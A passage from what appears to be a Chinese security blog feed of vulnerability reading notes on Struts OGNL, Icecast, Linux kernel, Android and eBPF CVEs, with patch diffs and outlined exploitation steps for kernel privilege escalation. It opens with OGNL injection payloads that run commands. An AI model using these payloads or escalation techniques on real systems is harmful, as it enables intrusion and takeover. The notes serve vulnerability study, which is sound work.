rel="noopener">#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))</li></ul></li><li>_memberAccess不能用了<ul><li>(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))</li></ul></li></ul><p>还有一些方法就不粘了，不甚了解<code>Struts</code>。</p><p><a href="https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776" target="_blank" rel="noopener">https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776</a></p><h2 id="CVE-2018-18820-Snprintf-Vulnerability-in-Icecast"><a href="#CVE-2018-18820-Snprintf-Vulnerability-in-Icecast" class="headerlink" title="CVE-2018-18820: Snprintf Vulnerability in Icecast"></a>CVE-2018-18820: Snprintf Vulnerability in Icecast</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">post_offset += <span class="built_in">snprintf</span>(post + post_offset,</span><br><span class="line">                        <span class="keyword">sizeof</span>(post) - post_offset,</span><br><span class="line">                        <span class="string">"&amp;%s%s=%s"</span>,</span><br><span class="line">                        url-&gt;prefix_headers ? url-&gt;prefix_headers : <span class="string">""</span>,</span><br><span class="line">                        cur_header, header_valesc);</span><br></pre></td></tr></table></figure><p>使<code>sizeof(post) - post_offset</code>下溢，变的很大，这样snprintf就保护不了缓冲区了。</p><p>修复方法：检查返回值是否超出缓冲区。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;IE沙箱逃逸：CVE-2019-0880&quot;&gt;&lt;a href=&quot;#IE沙箱逃逸：CVE-2019-0880&quot; class=&quot;headerlink&quot; title=&quot;IE沙箱逃逸：CVE-2019-0880&quot;&gt;&lt;/a&gt;IE沙箱逃逸：CVE-2019-0880&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Kernel相关漏洞文章阅读</title>
    <link href="https://github.com/Cracke-S-J/2020/06/15/Kernel%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB/"/>
    <id>https://github.com/Cracke-S-J/2020/06/15/Kernel%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB/</id>
    <published>2020-06-15T11:55:01.000Z</published>
    <updated>2020-07-02T04:49:41.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="堆喷套路"><a href="#堆喷套路" class="headerlink" title="堆喷套路"></a>堆喷套路</h2><p>size是否可控制？content是否可控？</p><p>可能存在阻塞的系统调用里面找找？文件系统、驱动这些去找找？</p><ul><li>32位机器上，用ipv6喷射很稳定</li><li>64位部分机型ip_mc_socklist比0x30要大</li><li>可以setxattr喷射，稳定性不好</li><li>sendmmsg有最小值限制</li><li>add_key/sendmmsg内存用完了之后立马被kfree</li><li>setsockopt</li></ul><h2 id="绕保护套路"><a href="#绕保护套路" class="headerlink" title="绕保护套路"></a>绕保护套路</h2><ul><li>关掉addr_limit</li></ul><h2 id="CVE-2017-8890"><a href="#CVE-2017-8890" class="headerlink" title="CVE-2017-8890"></a>CVE-2017-8890</h2><p>CVE-2017-8890是启明星辰ADLab去年披露的linux kernel double free漏洞，取名Phoenix Talon（凤凰爪四趾），可影响几乎所有Linux kernel 2.5.69 ~ Linux kernel 4.11的内核版本、对应的发行版本以及相关国产系统。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>具体代码分析<a href="https://paper.seebug.org/327/" target="_blank" rel="noopener">这里</a>有，感觉单看别人粘代码分析乱七八糟的，还是要自己打开<a href="https://elixir.bootlin.com/linux/latest/source" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/latest/source</a>去前前后后看一遍。</p><p>先看两个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> &#123;</span></span><br><span class="line">    <span class="comment">/* sk and pinet6 has to be the first two members of inet_sock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>     <span class="title">sk</span>;</span></span><br><span class="line"></span><br><span class="line">    ........</span><br><span class="line"></span><br><span class="line">    __be32          inet_saddr;</span><br><span class="line">    __s16           uc_ttl;</span><br><span class="line">    __u16           cmsg_flags;</span><br><span class="line">    __be16          inet_sport;</span><br><span class="line">    __u16           inet_id;</span><br><span class="line"></span><br><span class="line">    ..........</span><br><span class="line">    __be32          mc_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_mc_socklist</span> __<span class="title">rcu</span> *<span class="title">mc_list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_cork_full</span>   <span class="title">cork</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_mc_socklist</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_mc_socklist</span> __<span class="title">rcu</span> *<span class="title">next_rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_mreqn</span>     <span class="title">multi</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        sfmode;     <span class="comment">/* MCAST_&#123;INCLUDE,EXCLUDE&#125; */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_sf_socklist</span> __<span class="title">rcu</span> *<span class="title">sflist</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><ul><li>当我们使用socket编程时，在服务端创建一个socket，内核会创建一个<code>inet_sock</code>，称为sock1；</li><li>当服务端调用accept接收外来数据的时候会创建一个新的<code>inet_sock</code>，称为sock2；</li><li>sock2的<code>ip_mc_socklist</code>指针拷贝自sock1；</li><li>此时内核中存在两个不同的sock，它们的<code>ip_mc_socklist</code>却指向同一个对象；</li><li>当服务端close socket的时候，内核会free对应的<code>inet_sock</code>，在这里是sock1，也会free对应的<code>ip_mc_socklist</code>；</li><li>当服务端关闭accpet创建的<code>inet_sock</code>对象sock2时，其对应的<code>ip_mc_socklist</code>已经被释放过了，再次释放造成double free。</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="初步"><a href="#初步" class="headerlink" title="初步"></a>初步</h4><ul><li>堆喷，第一次free之后占位控制内相<ul><li>寻找对象（64字节）<ul><li>sendmmsg（未成功（我没试过</li><li>ipv6_mc_socklist（内存对齐以后不是64字节了</li></ul></li><li>解决问题，给ipv6_mc_socklist打个patch，调整内部成员顺序使其对齐成64字节</li><li>将ipv6_mc_socklist的adrr设为”ff02:abcd:0:0:0:0:0:1”，通过读ip_mc_socklist-&gt;next_rcu判断是否堆喷成功</li></ul></li><li>劫持EIP<ul><li>发现<code>ip_mc_socklist-&gt;rcu-&gt;func</code>是一个函数指针，而且会在被free时调用，可以修改它然后触发二次free吗？</li><li>不能，因为<code>kfree_rcu-&gt;__kfree_rcu-&gt;kfree_call_rcu-&gt;__call_rcu</code>，在函数参数转换的时候，它被修改成了偏移量。</li><li>所以我们下步思路是在<code>kfree_rcu</code>之后<code>__call_rcu</code>之前，对该指针再次修改。</li><li>也就是ret2usr，在到达用户空间以后，马上多线程去修改在用户空间的伪造的结构体中的函数指针。</li></ul></li><li>执行shellcode<ul><li>祖传方法<code>commit_creds(prepare_kernel_cred(0))</code>，发现不行，因为执行的时候由于内核软中断等原因，并不是位于exp进程对应上下文。</li><li>需要自己写shellcode，找到<code>pid-&gt;task_struct-&gt;cred</code>，改成0即可。</li></ul></li></ul><p><strong>注意</strong>：本利用思路没有考虑SMEP/SMAP等保护（逃。</p><h4 id="进一步思考"><a href="#进一步思考" class="headerlink" title="进一步思考"></a>进一步思考</h4><p>绕过PXN，PXN是什么来着？哦，是<strong>Privileged eXecute Never</strong>，绕过它就是不能用ret2usr。</p><p>用jop，先构思一条理想中的jop，首先覆盖一个常用的内核函数以达到永久劫持EIP，然后泄露内核栈找到  addlimit修改这个值让任意地址可以读写，然后在汇编中正则查找。</p><h2 id="CVE-2017-13253"><a href="#CVE-2017-13253" class="headerlink" title="CVE-2017-13253"></a>CVE-2017-13253</h2><p>Android Drm服务堆溢出。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>没有检查<code>要复制的数据+目标缓冲区的位置是否超过堆的size</code>，检查不完整。</p><p>贴几处check:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sum &lt;= SIZE_MAX</span><br><span class="line">subsampleSizes == totalSize</span><br><span class="line">totalSize &lt;= source.mSharedMemory-&gt;size()</span><br><span class="line">Offset &lt;= source.mSharedMemory-&gt;size() - totalSize</span><br><span class="line"></span><br><span class="line"><span class="comment">// 源缓冲区不溢出</span></span><br><span class="line">source.offset + offset + source.size &gt; sourceBase-&gt;getSize();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标缓冲区在堆内</span></span><br><span class="line">destBuffer.offset + destBuffer.size &gt; destBase-&gt;getSize()</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>看下<a href="https://android.googlesource.com/platform/frameworks/av/+/871412cfa05770cfd8be0a130b68386775445057%5E%21/#F0" target="_blank" rel="noopener">补丁</a>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+                sp&lt;IMemory&gt; dest = destination.mSharedMemory;</span><br><span class="line">+                <span class="keyword">if</span> (totalSize &gt; dest-&gt;size() ||</span><br><span class="line">+                        (<span class="keyword">size_t</span>)dest-&gt;offset() &gt; dest-&gt;size() - totalSize) &#123;</span><br><span class="line">+                    reply-&gt;writeInt32(BAD_VALUE);</span><br><span class="line">+                    android_errorWriteLog(<span class="number">0x534e4554</span>, <span class="string">"71389378"</span>);</span><br><span class="line">+                    <span class="keyword">return</span> OK;</span><br><span class="line">+                &#125;</span><br></pre></td></tr></table></figure><p>从patch也可以看出漏洞成因了。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>据说是不能利用，poc运行结果如下：</p><ul><li>如果在2018年3月之后的Android版本 decrypt 会返回bad_value（-22）。</li><li>如果没有crash（overwritten data 是可写的）decrypt return 他copy的数据的量。</li><li>如果供应商将HAL实现为单独的进程?（例如Pixel 2），则解密应该返回UNKNOWN_ERROR（-32）。</li><li>如果供应商在同一过程中实施HAL?（例如Nexus 5X），则解密应返回0。</li></ul><h2 id="CVE-2017-13258"><a href="#CVE-2017-13258" class="headerlink" title="CVE-2017-13258"></a>CVE-2017-13258</h2><p>蓝牙BNEP漏洞；BNEP是封装网络协议数据包的。（喂，这是哪门Kernel？）</p><p>总之就是解析包的时候逻辑有问题：</p><ul><li>构造一个扩展包，只有长度没有cmd；</li><li>类型设为cmd_not_understood；</li><li>解析的时候cmd_not_understood要把不能understood的cmd返回来；</li><li>由于没有cmd、length可控制，所以返回时根据代码来看泄露了*(p + len)这个字节。</li><li>简单地通过设计包绕过一下check。</li></ul><p>Exp：<a href="https://www.exploit-db.com/exploits/44326" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44326</a></p><h2 id="CVE-2019-8835"><a href="#CVE-2019-8835" class="headerlink" title="CVE-2019-8835"></a>CVE-2019-8835</h2><p><a href="https://www.anquanke.com/post/id/203416" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203416</a></p><p>eBPF程序在用户空间生成字节码，在内核空间虚拟机中执行，这就需要很多检查。</p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当虚拟机verifier的时候，<code>bpf_reg_state</code>来记录寄存器信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ptype <span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> = <span class="title">struct</span> <span class="title">bpf_reg_state</span> &#123;</span></span><br><span class="line">    <span class="keyword">enum</span> bpf_reg_type type;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        u16 range;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">        u32 btf_id;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> raw;</span><br><span class="line">    &#125;;</span><br><span class="line">    s32 off;</span><br><span class="line">    u32 id;</span><br><span class="line">    u32 ref_obj_id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span></span><br><span class="line">    s64 smin_value;<span class="comment">//有符号时可能的最小值</span></span><br><span class="line">    s64 smax_value;<span class="comment">//有符号时可能的最大值</span></span><br><span class="line">    u64 umin_value;</span><br><span class="line">    u64 umax_value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">    u32 frameno;</span><br><span class="line">    s32 subreg_def;</span><br><span class="line">    <span class="keyword">enum</span> bpf_reg_liveness live;</span><br><span class="line">    <span class="keyword">bool</span> precise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算<code>smin_value/smax_value</code> or <code>umin_value/umax_value</code>其中有一个检查叫<code>reg_bound_offset32</code>，它计算范围的时候有些问题。64位下没什么；32位的话会把之前状态转移的umin_value和umax_value只取低32bit参与计算，假如计算之前umin_value == 1，umax_value == 100000001 , 取低32bit之后他们都会等于1，所以该状态下可以构造出任意值的寄存器都会被认做1或者别的常数，从而绕过虚拟机检测。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>地址泄露<ul><li>verifier认为的：(1 &amp; 2) &gt;&gt; 1 == 0, 实际运行时候的：(2 &amp; 2) &gt;&gt; 1 == 1；</li><li>然后<code>r6 = r6 - 0x110</code>，<code>r7 = r7 - r6</code>，check的时候是稳过的，实际上已经造成了越界读写；</li><li>查找偏移泄露出全局变量<code>const struct bpf_map_ops *array_map_ops</code>，绕过kaslr；</li></ul></li><li>任意地址写<ul><li>利用r7写入，ops改成fake_ops；把<code>map_update_elem</code>改成<code>map_push_elem</code>；</li><li>然后该流程变为<code>index == value[0]; next = flags</code>， 最终效果是<code>*flags = value[0]</code>；</li><li><code>value[0]</code>和<code>flags</code>都是ring3下传的，所以现实了任意地址写4个byte；</li></ul></li><li>提权<ul><li>祖传提权：<code>init_pid_ns-&gt;task_struct-&gt;cred</code>；</li><li>modprobe_path：modprobe_path指向了一个内核在运行未知文件类型时运行的二进制文件，当内核运行一个错误格式的文件的时候，会调用这个modprobe_path所指向的二进制文件；</li></ul></li></ul><h2 id="CVE-2020-11477"><a href="#CVE-2020-11477" class="headerlink" title="CVE-2020-11477"></a>CVE-2020-11477</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>原理是整数溢出造成的Dos；很难触发，威胁不大。</p><p><code>tcp_gso_segs</code>代表小报文个数，是uint_16，而<code>skb_buff</code>结构体最多可以由17 <em> 32 </em> 1024 / 8 = 69632个报文碎片积累而成，所以可以考虑在极限情况下触发这个case。</p><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>触发起来条件其实是很苛刻的。</p><ul><li>客户端连接服务端（同时三次握手过程中强制设置接受mss最大值为8）<ul><li>实际上很难把它设成8，因为默认发行版linux系统都开启TSO（TCP Segment Offload），为了发挥网卡性能，网上会不断尝试扩大mss。</li><li>TCP选项头设为40的话，可以加上长度为12的时间戳，或者重新编译加上md5。</li></ul></li><li>客户端诱导服务端发送超长报文给客户端，贴近最大允许长度32k。<ul><li>这一步是可以做到的，通过服务器下载文件时（linux内核调用tcp_sendpage不走tcp_sendmsg调用可以逼近报文极限值，需要超过31k大小，实际情况是比较罕见的），发现http服务器将客户端get的数据合并，逼近32k大小数据下发到客户端。</li></ul></li><li>客户端不断发送重传要求，服务端重复发送17次报文填满skb分片队列，导致tcp_gso_segs变量整数溢出，导致服务器远程拒绝服务。<ul><li>TCP重传过于迅速，积累不到65536个报文，马上就修正顺序了。</li><li>分布式并发攻击可以做到积累报文超过65536。</li></ul></li></ul><h2 id="Linux-Kernel-the-ROP-Exploit-of-Stack-Overflow-in-Android-Kernel"><a href="#Linux-Kernel-the-ROP-Exploit-of-Stack-Overflow-in-Android-Kernel" class="headerlink" title="Linux Kernel: the ROP Exploit of Stack Overflow in Android Kernel"></a>Linux Kernel: the ROP Exploit of Stack Overflow in Android Kernel</h2><p><a href="https://paper.seebug.org/947/" target="_blank" rel="noopener">https://paper.seebug.org/947/</a></p><p>好像也没写什么，就是Android Kernel搭环境+最基本的ROP，欺负我看不懂嘤文。</p><h2 id="CVE-2020-1206-CVE-2020-0796"><a href="#CVE-2020-1206-CVE-2020-0796" class="headerlink" title="CVE-2020-1206/CVE-2020-0796"></a>CVE-2020-1206/CVE-2020-0796</h2><p>SMBleed是内核内存泄露，因为压缩包校验长度时，写长一点没有校验出来，造成未初始化内存读取。</p><p>SMBGhost长度整数溢出导致堆溢出，RCE。</p><h2 id="CVE-2020-0041"><a href="#CVE-2020-0041" class="headerlink" title="CVE-2020-0041"></a>CVE-2020-0041</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/drivers/android/binder.c b/drivers/android/binder.c</span><br><span class="line">index e9bc9fc..b2dad43 <span class="number">100644</span></span><br><span class="line">--- a/drivers/android/binder.c</span><br><span class="line">+++ b/drivers/android/binder.c</span><br><span class="line">@@ <span class="number">-3310</span>,<span class="number">7</span> +<span class="number">3310</span>,<span class="number">7</span> @@</span><br><span class="line">            <span class="keyword">binder_size_t</span> parent_offset;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">binder_fd_array_object</span> *<span class="title">fda</span> =</span></span><br><span class="line"><span class="class">                <span class="title">to_binder_fd_array_object</span>(<span class="title">hdr</span>);</span></span><br><span class="line">-           <span class="keyword">size_t</span> num_valid = (buffer_offset - off_start_offset) *</span><br><span class="line">+           <span class="keyword">size_t</span> num_valid = (buffer_offset - off_start_offset) /</span><br><span class="line">                        <span class="keyword">sizeof</span>(<span class="keyword">binder_size_t</span>);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">binder_buffer_object</span> *<span class="title">parent</span> =</span></span><br><span class="line"><span class="class">                <span class="title">binder_validate_ptr</span>(<span class="title">target_proc</span>, <span class="title">t</span>-&gt;<span class="title">buffer</span>,</span></span><br><span class="line"><span class="class">@@ -3384,7 +3384,7 @@</span></span><br><span class="line"><span class="class">                <span class="title">t</span>-&gt;<span class="title">buffer</span>-&gt;<span class="title">user_data</span> + <span class="title">sg_buf_offset</span>;</span></span><br><span class="line">            sg_buf_offset += ALIGN(bp-&gt;length, <span class="keyword">sizeof</span>(u64));</span><br><span class="line"></span><br><span class="line">-           num_valid = (buffer_offset - off_start_offset) *</span><br><span class="line">+           num_valid = (buffer_offset - off_start_offset) /</span><br><span class="line">                    <span class="keyword">sizeof</span>(<span class="keyword">binder_size_t</span>);</span><br><span class="line">            ret = binder_fixup_parent(t, thread, bp,</span><br><span class="line">                          off_start_offset,</span><br></pre></td></tr></table></figure><p>从看patch来看，是重构代码引进的，本来应该是/的地方写成了*，导致index越界，这个index是num_valid，用来做check的；它算错了的话自然相关check也可以绕过。</p><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="先看下两段代码"><a href="#先看下两段代码" class="headerlink" title="先看下两段代码"></a>先看下两段代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> BINDER_TYPE_FDA: &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">binder_object</span> <span class="title">ptr_object</span>;</span></span><br><span class="line">  <span class="keyword">binder_size_t</span> parent_offset;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">binder_fd_array_object</span> *<span class="title">fda</span> =</span></span><br><span class="line"><span class="class">    <span class="title">to_binder_fd_array_object</span>(<span class="title">hdr</span>);</span></span><br><span class="line">  <span class="keyword">size_t</span> num_valid = (buffer_offset - off_start_offset) *</span><br><span class="line">        <span class="keyword">sizeof</span>(<span class="keyword">binder_size_t</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">binder_buffer_object</span> *<span class="title">parent</span> =</span></span><br><span class="line"><span class="class">    <span class="title">binder_validate_ptr</span>(<span class="title">target_proc</span>, <span class="title">t</span>-&gt;<span class="title">buffer</span>,</span></span><br><span class="line"><span class="class">            &amp;<span class="title">ptr_object</span>, <span class="title">fda</span>-&gt;<span class="title">parent</span>,</span></span><br><span class="line"><span class="class">            <span class="title">off_start_offset</span>,</span></span><br><span class="line"><span class="class">            &amp;<span class="title">parent_offset</span>,</span></span><br><span class="line"><span class="class">            <span class="title">num_valid</span>);</span></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BINDER_TYPE_PTR: &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">binder_buffer_object</span> *<span class="title">bp</span> =</span></span><br><span class="line"><span class="class">    <span class="title">to_binder_buffer_object</span>(<span class="title">hdr</span>);</span></span><br><span class="line">  <span class="keyword">size_t</span> buf_left = sg_buf_end_offset - sg_buf_offset;</span><br><span class="line">  <span class="keyword">size_t</span> num_valid;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">  <span class="keyword">if</span> (binder_alloc_copy_user_to_buffer(</span><br><span class="line">        &amp;target_proc-&gt;alloc,</span><br><span class="line">        t-&gt;buffer,</span><br><span class="line">        sg_buf_offset,</span><br><span class="line">        (<span class="keyword">const</span> <span class="keyword">void</span> __user *)</span><br><span class="line">          (<span class="keyword">uintptr_t</span>)bp-&gt;buffer,</span><br><span class="line">        bp-&gt;length)) &#123;</span><br><span class="line">    binder_user_error(<span class="string">"%d:%d got transaction with invalid offsets ptrn"</span>,</span><br><span class="line">          proc-&gt;pid, thread-&gt;pid);</span><br><span class="line">    return_error_param = -EFAULT;</span><br><span class="line">    return_error = BR_FAILED_REPLY;</span><br><span class="line">    return_error_line = __LINE__;</span><br><span class="line">    <span class="keyword">goto</span> err_copy_data_failed;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fixup buffer pointer to target proc address space */</span></span><br><span class="line">  bp-&gt;buffer = (<span class="keyword">uintptr_t</span>)</span><br><span class="line">    t-&gt;buffer-&gt;user_data + sg_buf_offset;</span><br><span class="line">  sg_buf_offset += ALIGN(bp-&gt;length, <span class="keyword">sizeof</span>(u64));</span><br><span class="line"></span><br><span class="line">  num_valid = (buffer_offset - off_start_offset) *</span><br><span class="line">      <span class="keyword">sizeof</span>(<span class="keyword">binder_size_t</span>);</span><br><span class="line"></span><br><span class="line">  ret = binder_fixup_parent(t, thread, bp,</span><br><span class="line">          off_start_offset,</span><br><span class="line">          num_valid,</span><br><span class="line">          last_fixup_obj_off,</span><br><span class="line">          last_fixup_min_off);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//drivers/android/binder.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">binder_fixup_parent</span><span class="params">(struct binder_transaction *t,</span></span></span><br><span class="line"><span class="function"><span class="params">                  struct binder_thread *thread,</span></span></span><br><span class="line"><span class="function"><span class="params">                  struct binder_buffer_object *bp,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">binder_size_t</span> off_start_offset,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">binder_size_t</span> num_valid,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">binder_size_t</span> last_fixup_obj_off,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">binder_size_t</span> last_fixup_min_off)</span></span></span><br><span class="line"><span 